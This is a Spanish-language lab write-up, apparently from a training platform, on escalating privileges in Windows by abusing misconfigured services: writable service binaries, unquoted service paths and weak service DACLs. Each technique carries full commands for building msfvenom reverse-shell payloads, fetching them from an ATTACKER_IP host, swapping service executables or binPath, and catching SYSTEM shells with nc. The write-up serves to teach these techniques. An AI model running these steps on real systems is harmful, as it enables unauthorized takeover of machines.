# Abusing Service Misconfigurations

### Windows Services

El (SCM) Service Control Manageres, es un proceso encargado de gestionar el estado de los servicios según sea necesario, comprobar el estado actual de cualquier servicio y dar una forma de configurar los servicios.

Para ver la estructura de un servicio, podemos comprobar la configuración del servicio apphostsvc con el comando `sc qc` :

```
C:\> sc qc apphostsvc 
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc 

	TYPE :               20 WIN32_SHARE_PROCESS 
	START_TYPE :         2 AUTO_START 
	ERROR_CONTROL :      1 NORMAL 
	BINARY_PATH_NAME :   C:\Windows\system32\svchost.exe -k apphost
	LOAD_ORDER_GROUP :
	TAG :                0 
	DISPLAY_NAME :       Application Host Helper Service 
	DEPENDENCIES :
	SERVICE_START_NAME : localSystem
```

Lista de Control de Acceso Discrecional (DACL), indica quién tiene permiso para iniciar, detener, pausar, consultar el estado, la configuración o reconfigurar el servicio, entre otros privilegios&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20250123180414 (2).png" alt=""><figcaption></figcaption></figure>

TODAS las configuraciones de los servicios se guardan en : `HKLM\SYSTEM\CurrentControlSet\Services\`

<figure><img src="../../.gitbook/assets/Pasted image 20250123180516.png" alt=""><figcaption></figcaption></figure>

> Por defecto sólo los administradores pueden modificar estas entradas del registro

### Insecure Permissions on Service Executable

Explotación de Splinterware System Scheduler

1º Veamos la configuración del servicio con `sc` :

```
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc 

	TYPE :               10 WIN32_SHARE_PROCESS 
	START_TYPE :         2 AUTO_START 
	ERROR_CONTROL :      1 IGNORE 
	BINARY_PATH_NAME :   C:\PROGRA~2\SYSTEM~1\WService.exe 
	LOAD_ORDER_GROUP :
	TAG :                0 
	DISPLAY_NAME :        System Scheduler Service 
	DEPENDENCIES :
	SERVICE_START_NAME : .\svcusr1
```

> Con esto vemos que el servicio vulnerable se ejecuta como `.\svcusr1` y el se encuentra en la ruta `C:\PROGRA~2\SYSTEM~1\WService.exe`

2º Ver los permisos con `icacls` :

```
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Vemos que el grupo `Everyone` tiene permisos `(M)` de modificación sobre el ejecutable.

> Eso significa que podemos sobrescribirlo con cualquier payload y a la hora de entablar conexión por una revershell, nos la dará como los privilegios del usuario configurado.

Ahora generemos un payload con `msfvenom` y enviarlo desde un servicio web con `python`

3º Crea un Payload y envialo con Python Usamos `msfvenom` para el payload `user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`

Levantamos un servidor web con `python` para enviarlo:

```
user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

4º Obtener el Payload desde el equipo de la Victima

> Desde la Powershell podemos hacerlo

`wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe`

5º Reemplazar el Payload en el ejecutable Una vez que el Payload este en el Windows de la victima, reemplazamos el ejecutable del servicio, con nuestro payload.

```bash
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp #Opcional, crear una copia del archvio

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe #Remplazamos por el nombre del payload, con el nombre del ejecutable

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F #Damos nuevos permisos de ejecucion
```

6º Ponerse en escucha con `nc` , parar y levantar el servicio `user@attackerpc$ nc -lvp 4445`

```
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```

```
user@attackerpc$ nc -lvp 4445 

Listening on 0.0.0.0 4445 Connection received on 10.10.175.90 50649 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. 

C:\Windows\system32>whoami 
wprivesc1\svcusr1
```

### Service Paths sin cotización

Hay veces que no tengamos permisos de escritura en los ejecutables, pero se puede dar la situación en la que, el nombre del ejecutable no esta "entrecomillado" y/o tiene espacios en su nombre. Esta técnica es algo rara. Veamos la diferencia entre dos servicios:

```
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

> PowerShell tiene 'sc' como alias de 'Set-Content', por lo tanto necesitas usar 'sc.exe' para controlar los servicios si estás en un prompt de PowerShell.

Ahora, veamos otro servicio sin es cotización adecuada:

```
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

Cuando el SCM intenta ejecutar el binario asociado, da error. Como hay espacios en el nombre de la carpeta «Disk Sorter Enterprise», el comando se vuelve ambiguo, y el SCM no sabe cuál de los siguientes está intentando ejecutar.

Normalmente, cuando se envía un comando, los espacios se utilizan como separadores de argumentos, ejemplo; ruta1 ruta2 ruta3, excepto si esta "entrecomillado", ejemplo; "ruta completa buena" Esto significa que la interpretación «correcta» del comando sin comillas sería ejecutar `C:\MyPrograms\\Disk.exe` y tomar el resto como argumentos.

Si un atacante crea cualquiera de los ejecutables que se buscan antes que el ejecutable de servicio esperado, puede forzar al servicio a ejecutar un ejecutable arbitrario.

La mayoría de los ejecutables de servicio se instalarán por defecto en `C:\Program Files` o `C:\Program Files (x86)` , que no es escribible por usuarios sin privilegios.

En est caso, el administrador instaló los binarios en `C:\\MyPrograms`. Por defecto, esto hereda los permisos del directorio `C:`, lo que permite a cualquier usuario crear archivos y carpetas en él. Podemos comprobarlo usando `icacls` :

```
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

> El grupo `BUILTIN\\Users` tiene privilegios AD y WD, lo que permite al usuario crear subdirectorios y archivos, respectivamente.

El proceso de crear un payload exe-service con msfvenom y transferirlo a la victima, es el mismo que el de antes:

```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Obtener el Payload desde el equipo de la Victima

`wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe`

Ponerse en escucha como atacante: `user@attackerpc$ nc -lvp 4446`

Ahora, solo muévelo a cualquiera de las ubicaciones donde podría ocurrir el hijacking. En este caso, moveremos nuestro payload a `C:\MyPrograms\Disk.exe.`

```bash
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe #Se le cambia el nombre

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F #Se le da permisos
        Successfully processed 1 files.
```

Ahora, igual que en arriba, se para y activa el servicio, para así, gracias a los nombres, busque disk primero, y encuentre nuestro payload.

> Es casi casi como un PATH hijacking de linux

```
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

```
user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
```

### Insecure Service Permissions

Puede ser que el ejecutable del servicio está bien configurada y la ruta binaria del servicio está bien escrita. Pero si la DACL del servicio (no la DACL del ejecutable del servicio) te permite modificar la configuración de un servicio, podrás reconfigurar el servicio

> La DACL (Discretionary Access Control List) es una lista de control de acceso que define qué usuarios o grupos tienen permiso para realizar acciones específicas sobre un objeto en un sistema Windows, como un servicio, archivo, o carpeta

Esto te permitirá apuntar a cualquier ejecutable que necesites y ejecutarlo. Para comprobar la DACL de un servicio desde la cmd, se puede utilizar Accesschk de la suite Sysinternals

```
C:\tools\AccessChk> accesschk64.exe -qlc thmservice 

[0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM 
	SERVICE_QUERY_STATUS 
	SERVICE_QUERY_CONFIG 
	SERVICE_INTERROGATE 
	SERVICE_ENUMERATE_DEPENDENTS 
	SERVICE_PAUSE_CONTINUE 
	SERVICE_START 
	SERVICE_STOP 
	SERVICE_USER_DEFINED_CONTROL 
	READ_CONTROL 
	
[4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users 
	SERVICE_ALL_ACCESS
```

Aquí podemos ver que el grupo `BUILTIN\\Users` tiene el permiso `SERVICE_ALL_ACCESS` (total), lo que significa que cualquier usuario puede reconfigurar el servicio.

Volvemos a lo mismo de antes, contruir la revershell con msfvenom:

```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ python3 -m http.server
```

Ahora lo descargamos en el equipo victima `wget http://ATTACKER_IP:8000/rev-svc3.exe -O rev-svc3.exe`

También concederemos a `Everyone` (permisos completos sobre el archivo) para asegurarnos de que puede ser ejecutado por el servicio `C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F`

Para cambiar el ejecutable y el asociado al servicio, podemos utilizar el siguiente comando (tenga en cuenta los espacios después de los signos iguales cuando utilice `sc.exe`)

\`C:> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

Elegimos LocalSystem porque es la cuenta con más privilegios disponible. Para activar nuestro payload, solo hay que reiniciar el servicio:

```
C:\> sc stop THMService 
C:\> sc start THMService
```

Nos ponemos a la escucha con `nc`

```
user@attackerpc$ nc -lvp 4447 
Listening on 0.0.0.0 4447 
Connection received on 10.10.175.90 50650 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. 

C:\Windows\system32>whoami 
NT AUTHORITY\SYSTEM
```
